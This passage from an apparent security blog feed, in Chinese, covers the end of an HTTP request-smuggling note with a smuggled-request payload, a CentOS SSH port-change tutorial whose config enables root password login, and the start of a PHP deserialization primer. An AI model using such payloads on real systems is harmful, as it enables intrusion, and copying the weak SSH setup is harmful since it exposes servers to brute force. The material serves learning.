此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理<code>Transfer-encoding</code>请求头，将<code>Transfer-Encoding</code>隐藏在服务端的一个<code>chain</code>中时，它将会回退到使用<code>Content-Length</code>去发送请求。读取到</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">5c<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>认为是读取完毕了。后面的数据就认为是另一个请求：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Type: application/x-www-form-urlencoded<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 15<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>x=1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>成功报错，造成HTTP请求走私。</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用高端口ssh</title>
    <link href="/2021/06/03/%E4%BD%BF%E7%94%A8%E9%AB%98%E7%AB%AF%E5%8F%A3ssh/"/>
    <url>/2021/06/03/%E4%BD%BF%E7%94%A8%E9%AB%98%E7%AB%AF%E5%8F%A3ssh/</url>
    
    <content type="html"><![CDATA[<h1 id="Centos7-使用-ssh-连接之改端口-22"><a href="#Centos7-使用-ssh-连接之改端口-22" class="headerlink" title="Centos7 使用 ssh 连接之改端口 22"></a>Centos7 使用 ssh 连接之改端口 22</h1><p><strong>题记：</strong></p><p>说来贻笑大方，开始接触 ssh 时认为 22 端口作为 ssh 常用端口，放到公网上容易被别人爆破，谁让我用的是弱密码呢，我错了，但我下次还敢哈哈哈，其实有没有改端口，使用弱密码映射到公网是极不安全的，对方只要扫一扫你开放的端口，简单的爆破一下你就完蛋</p><p><strong>正题</strong></p><h2 id="一、更改-sshd-配置文件"><a href="#一、更改-sshd-配置文件" class="headerlink" title="一、更改 sshd 配置文件"></a>一、更改 sshd 配置文件</h2><p>ssh_config 是客服端的配置文件，而 centos7 作为受，啊哈，即服务端，等待连接的，修改 sshd_config</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#       $OpenBSD: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp $</span><br><br><span class="hljs-meta"># This is the sshd server system-wide configuration file.  See</span><br><span class="hljs-meta"># sshd_config(5) for more information.</span><br><br><span class="hljs-meta"># This sshd was compiled with PATH=/usr/local/bin:/usr/bin</span><br><br><span class="hljs-meta"># The strategy used for options in the default sshd_config shipped with</span><br><span class="hljs-meta"># OpenSSH is to specify options with their default value where</span><br><span class="hljs-meta"># possible, but leave them commented.  Uncommented options override the</span><br><span class="hljs-meta"># default value.</span><br><br><span class="hljs-meta"># If you want to change the port on a SELinux system, you have to tell</span><br><span class="hljs-meta"># SELinux about this change.</span><br><span class="hljs-meta"># semanage port -a -t ssh_port_t -p tcp #PORTNUMBER</span><br><span class="hljs-meta">#</span><br><span class="hljs-meta">#Port 22</span><br>⭐Port <span class="hljs-number">23333</span><br><span class="hljs-meta">#AddressFamily any</span><br>⭐ListenAddress <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>⭐ListenAddress ::<br><br>HostKey /etc/ssh/ssh_host_rsa_key<br><span class="hljs-meta">#HostKey /etc/ssh/ssh_host_dsa_key</span><br>HostKey /etc/ssh/ssh_host_ecdsa_key<br>HostKey /etc/ssh/ssh_host_ed25519_key<br><br><span class="hljs-meta"># Ciphers and keying</span><br><span class="hljs-meta">#RekeyLimit default none</span><br><br><span class="hljs-meta"># Logging</span><br><span class="hljs-meta">#SyslogFacility AUTH</span><br>SyslogFacility AUTHPRIV<br><span class="hljs-meta">#LogLevel INFO</span><br><br><span class="hljs-meta"># Authentication:</span><br><br><span class="hljs-meta">#LoginGraceTime 2m</span><br>⭐PermitRootLogin yes<br><span class="hljs-meta">#StrictModes yes</span><br><span class="hljs-meta">#MaxAuthTries 6</span><br><span class="hljs-meta">#MaxSessions 10</span><br><br><span class="hljs-meta">#PubkeyAuthentication yes</span><br><br><span class="hljs-meta"># The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2</span><br><span class="hljs-meta"># but this is overridden so installations will only check .ssh/authorized_keys</span><br>AuthorizedKeysFile      .ssh/authorized_keys<br><br><span class="hljs-meta">#AuthorizedPrincipalsFile none</span><br><br><span class="hljs-meta">#AuthorizedKeysCommand none</span><br><span class="hljs-meta">#AuthorizedKeysCommandUser nobody</span><br><br><span class="hljs-meta"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><br><span class="hljs-meta">#HostbasedAuthentication no</span><br><span class="hljs-meta"># Change to yes if you don&#x27;t trust ~/.ssh/known_hosts for</span><br><span class="hljs-meta"># HostbasedAuthentication</span><br><span class="hljs-meta">#IgnoreUserKnownHosts no</span><br><span class="hljs-meta"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span><br><span class="hljs-meta">#IgnoreRhosts yes</span><br><br><span class="hljs-meta"># To disable tunneled clear text passwords, change to no here!</span><br><span class="hljs-meta">#PasswordAuthentication yes</span><br><span class="hljs-meta">#PermitEmptyPasswords no</span><br>⭐PasswordAuthentication yes<br><br><span class="hljs-meta"># Change to no to disable s/key passwords</span><br><span class="hljs-meta">#ChallengeResponseAuthentication yes</span><br>ChallengeResponseAuthentication no<br><br><span class="hljs-meta"># Kerberos options</span><br><span class="hljs-meta">#KerberosAuthentication no</span><br><span class="hljs-meta">#KerberosOrLocalPasswd yes</span><br><span class="hljs-meta">#KerberosTicketCleanup yes</span><br><span class="hljs-meta">#KerberosGetAFSToken no</span><br><span class="hljs-meta">#KerberosUseKuserok yes</span><br><br><span class="hljs-meta"># GSSAPI options</span><br>GSSAPIAuthentication yes<br>GSSAPICleanupCredentials no<br><span class="hljs-meta">#GSSAPIStrictAcceptorCheck yes</span><br><span class="hljs-meta">#GSSAPIKeyExchange no</span><br><span class="hljs-meta">#GSSAPIEnablek5users no</span><br><br><span class="hljs-meta"># Set this to &#x27;yes&#x27; to enable PAM authentication, account processing,</span><br><span class="hljs-meta"># and session processing. If this is enabled, PAM authentication will</span><br><span class="hljs-meta"># be allowed through the ChallengeResponseAuthentication and</span><br><span class="hljs-meta"># PasswordAuthentication.  Depending on your PAM configuration,</span><br><span class="hljs-meta"># PAM authentication via ChallengeResponseAuthentication may bypass</span><br><span class="hljs-meta"># the setting of &quot;PermitRootLogin without-password&quot;.</span><br><span class="hljs-meta"># If you just want the PAM account and session checks to run without</span><br><span class="hljs-meta"># PAM authentication, then enable this but set PasswordAuthentication</span><br><span class="hljs-meta"># and ChallengeResponseAuthentication to &#x27;no&#x27;.</span><br><span class="hljs-meta"># WARNING: &#x27;UsePAM no&#x27; is not supported in Red Hat Enterprise Linux and may cause several</span><br><span class="hljs-meta"># problems.</span><br>UsePAM yes<br><br><span class="hljs-meta">#AllowAgentForwarding yes</span><br><span class="hljs-meta">#AllowTcpForwarding yes</span><br><span class="hljs-meta">#GatewayPorts no</span><br>X11Forwarding yes<br><span class="hljs-meta">#X11DisplayOffset 10</span><br><span class="hljs-meta">#X11UseLocalhost yes</span><br><span class="hljs-meta">#PermitTTY yes</span><br><span class="hljs-meta">#PrintMotd yes</span><br><span class="hljs-meta">#PrintLastLog yes</span><br><span class="hljs-meta">#TCPKeepAlive yes</span><br><span class="hljs-meta">#UseLogin no</span><br><span class="hljs-meta">#UsePrivilegeSeparation sandbox</span><br><span class="hljs-meta">#PermitUserEnvironment no</span><br><span class="hljs-meta">#Compression delayed</span><br><span class="hljs-meta">#ClientAliveInterval 0</span><br><span class="hljs-meta">#ClientAliveCountMax 3</span><br><span class="hljs-meta">#ShowPatchLevel no</span><br><span class="hljs-meta">#UseDNS yes</span><br><span class="hljs-meta">#PidFile /var/run/sshd.pid</span><br><span class="hljs-meta">#MaxStartups 10:30:100</span><br><span class="hljs-meta">#PermitTunnel no</span><br><span class="hljs-meta">#ChrootDirectory none</span><br><span class="hljs-meta">#VersionAddendum none</span><br><br><span class="hljs-meta"># no default banner path</span><br><span class="hljs-meta">#Banner none</span><br><br><span class="hljs-meta"># Accept locale-related environment variables</span><br>AcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES<br>AcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT<br>AcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE<br>AcceptEnv XMODIFIERS<br><br><span class="hljs-meta"># override default of no subsystems</span><br>Subsystem       sftp    /usr/libexec/openssh/sftp-server<br><br><span class="hljs-meta"># Example of overriding settings on a per-user basis</span><br><span class="hljs-meta">#Match User anoncvs</span><br><span class="hljs-meta">#       X11Forwarding no</span><br><span class="hljs-meta">#       AllowTcpForwarding no</span><br><span class="hljs-meta">#       PermitTTY no</span><br><span class="hljs-meta">#       ForceCommand cvs server</span><br></code></pre></td></tr></table></figure><p>每一次更改配置文件都要重启服务才能生效</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#重启systemctl restart sshd</span><br><span class="hljs-meta">#查看systemctl status sshd</span><br><span class="hljs-meta">#停止systemctl stop sshd</span><br></code></pre></td></tr></table></figure><p>其他方法查看</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#进程ps -e|grep sshd</span><br><span class="hljs-meta">#网络状态netstat -an|grep 22888</span><br></code></pre></td></tr></table></figure><p>你以为这就结束了，nonono，还有两层层膜没有捅破</p><h2 id="二、开放端口"><a href="#二、开放端口" class="headerlink" title="二、开放端口"></a>二、开放端口</h2><h3 id="SELinux"><a href="#SELinux" class="headerlink" title="SELinux"></a>SELinux</h3><p>如果你关闭了这个安全系统，直接跳至 firewall-cmd</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">semanage port -l|<span class="hljs-keyword">grep</span> ssh<span class="hljs-comment">#打印SELinux开放ssh的情况</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/06/03/.png"></p><p>好吧 它只开放了 22</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">semanage</span> port -a -t ssh_port_t -p tcp <span class="hljs-number">23333</span>#添加端口<span class="hljs-number">23333</span><br></code></pre></td></tr></table></figure><p>再次打印，已经添加完毕</p><h3 id="firewall-cmd"><a href="#firewall-cmd" class="headerlink" title="firewall-cmd"></a>firewall-cmd</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">firewall-cmd <span class="hljs-params">--permanent</span> <span class="hljs-params">--query-port=23333/tcp</span><span class="hljs-comment">#打印防火墙是否开放了tcp的23333端口</span><br></code></pre></td></tr></table></figure><p>肯定没有</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">firewall-cmd <span class="hljs-params">--permanent</span> <span class="hljs-params">--add-port=23333/tcp</span><span class="hljs-comment">#添加防火墙规则</span><br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">firewall-<span class="hljs-keyword">cmd</span><span class="bash"> --reload<span class="hljs-comment">#重载防火墙策略</span></span><br></code></pre></td></tr></table></figure><p>你登录吧 😂</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>通信隧道</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="/2021/05/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/05/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>类中，实例化生成一个对象，而把这个对象转化成字符串，这个操作就是序列化。反过来，将字符串转化成类模板形式的对象，就是反序列化。两者结合就可以方便地存储和传输数据。</p><p>不同编程语言序列化后的存储文件不同，当然语法也不相同</p><p>我们以 php 语言为例</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210529193530927.png"></p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">serialize()</td><td align="center">将一个对象转换成一串字符串</td></tr><tr><td align="center">unserialize()</td><td align="center">将一串字符串转换成一个对象</td></tr></tbody></table><h2 id="PHP-序列化的格式"><a href="#PHP-序列化的格式" class="headerlink" title="PHP 序列化的格式"></a>PHP 序列化的格式</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs smali">a -<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>b - boolean<br>d -<span class="hljs-built_in"> double</span><br><span class="hljs-built_in"></span>i - integer<br>o - common object<br>r - reference<br>s - string<br>C - custom object<br>O - class//最常用的复合类型<br>N - null<br>R - pointer reference<br>U - unicode string<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;?php<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    public $a = <span class="hljs-string">&#x27;ThisA&#x27;</span>;<br>    protected $b = <span class="hljs-string">&#x27;ThisB&#x27;</span>;<br>    private $c = <span class="hljs-string">&#x27;ThisC&#x27;</span>;<br>    public <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;this is a test!&#x27;</span>;<br>    &#125;<br>&#125;<br>$test = <span class="hljs-keyword">new</span> Test();<br>var_dump(serialize($test));<br>echo <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>var_dump(unserialize(serialize($test)))<br>?&gt;<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-keyword">string</span>(<span class="hljs-number">84</span>) <span class="hljs-string">&quot;O:4:&quot;</span>Test<span class="hljs-string">&quot;:3:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:5:&quot;</span>ThisA<span class="hljs-string">&quot;;s:4:&quot;</span>*b<span class="hljs-string">&quot;;s:5:&quot;</span>ThisB<span class="hljs-string">&quot;;s:7:&quot;</span>Testc<span class="hljs-string">&quot;;s:5:&quot;</span>ThisC<span class="hljs-string">&quot;;&#125;&quot;</span><br><br><span class="hljs-keyword">object</span>(Test)#<span class="hljs-number">2</span> (<span class="hljs-number">3</span>) &#123; [<span class="hljs-string">&quot;a&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisA&quot;</span> [<span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-keyword">protected</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisB&quot;</span> [<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-keyword">private</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisC&quot;</span> &#125;<br></code></pre></td></tr></table></figure><h4 id="public-protected-private-在序列化时的区别"><a href="#public-protected-private-在序列化时的区别" class="headerlink" title="public/protected/private 在序列化时的区别"></a>public/protected/private 在序列化时的区别</h4><p>这个类的三个成员变量由于变量前的修饰不同，在序列化出来后显示的也不同。</p><p><code>s:1:&quot;a&quot;;s:5:&quot;ThisA&quot;;</code> ：以 <code>;</code>分开变量名和变量值，变量名为 1 个字符的 a，变量值为”ThisA”</p><p><code>s:4:&quot;*b&quot;;s:5:&quot;ThisA&quot;;</code>：多了 <code>*</code>，用以区分 protected 修饰符，另外实际页面中会出现乱码，实际上 protected 属性的表示方式是在变量名前加个<code>%00*%00</code></p><p><code>s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;</code>： 在变量名前加上了<code>%00类名%00</code></p><p>可以看到， 序列化后的字符串中并没有包含这个 test 方法的信息;反序列化后，类的成员变量被还原了，但是类方法没有被还原。</p><p>因为<strong>序列化不保存方法</strong></p><blockquote><p>①private 属性序列化的时候会在两侧加入空字节，private 属性序列化时会在变量前面加上加上类名</p><p>② 序列化不保存方法</p></blockquote><h2 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct()<span class="hljs-comment">//类的构造函数</span><br><br>__destruct()<span class="hljs-comment">//类的析构函数</span><br><br>__call()<span class="hljs-comment">//在对象中调用一个不可访问方法时调用</span><br><br>__callStatic()<span class="hljs-comment">//用静态方式中调用一个不可访问方法时调用</span><br><br>__get()<span class="hljs-comment">//获得一个类的成员变量时调用</span><br><br>__set()<span class="hljs-comment">//设置一个类的成员变量时调用</span><br><br>__isset()<span class="hljs-comment">//当对不可访问属性调用isset()或empty()时调用</span><br><br>__unset()<span class="hljs-comment">//当对不可访问属性调用unset()时被调用。</span><br><br>__sleep()<span class="hljs-comment">//执行serialize()时，先会调用这个函数</span><br><br>__wakeup()<span class="hljs-comment">//执行unserialize()时，先会调用这个函数</span><br><br>__toString()<span class="hljs-comment">//类被当成字符串时的回应方法</span><br><br>__invoke()<span class="hljs-comment">//调用函数的方式调用一个对象时的回应方法</span><br><br>__set_state()<span class="hljs-comment">//调用var_export()导出类时，此静态方法会被调用。</span><br><br>__clone()<span class="hljs-comment">//当对象复制完成时调用</span><br><br>__autoload()<span class="hljs-comment">//尝试加载未定义的类</span><br><br>__debugInfo()<span class="hljs-comment">//打印所需调试信息</span><br></code></pre></td></tr></table></figure><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p>创建对象时就会执行的构造函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__construct test&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&#x27;Damn&#x27;</span>, <span class="hljs-string">&#x27;zZ&#x27;</span>, <span class="hljs-string">&#x27;10086&#x27;</span>);<br><br><span class="hljs-comment">//输出：__construct test</span><br></code></pre></td></tr></table></figure><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>对象的所有引用都被删除或者当对象被显式销毁时执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct test&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> User();<br><br><span class="hljs-comment">//输出：__destruct test</span><br></code></pre></td></tr></table></figure><h3 id="Tostring"><a href="#Tostring" class="headerlink" title="__Tostring"></a>__Tostring</h3><p>当一个类对象被当成字符串时必须返回一个字符串 否则产生<strong>E_RECOVERABLE_ERROR</strong> 级别的致命错误</p><p>情形有</p><ul><li><p><input checked="" disabled="" type="checkbox">  echo ($obj)/print($obj)</p></li><li><p><input checked="" disabled="" type="checkbox">  字符串连接</p></li><li><p><input checked="" disabled="" type="checkbox">  格式化字符串</p></li><li><p><input checked="" disabled="" type="checkbox">  字符串==比较，比较的时候会转换参数类型</p></li><li><p><input checked="" disabled="" type="checkbox">  格式化 SQL 语句，绑定参数</p></li><li><p><input checked="" disabled="" type="checkbox">  数组中有字符串</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$foo</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$foo</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;foo = <span class="hljs-variable">$foo</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;foo;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> TestClass(<span class="hljs-string">&#x27;Hello&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$class</span>;<br><br><span class="hljs-comment">//输出：hello</span><br></code></pre></td></tr></table></figure><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个<strong>E_NOTICE</strong>级别的错误。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span 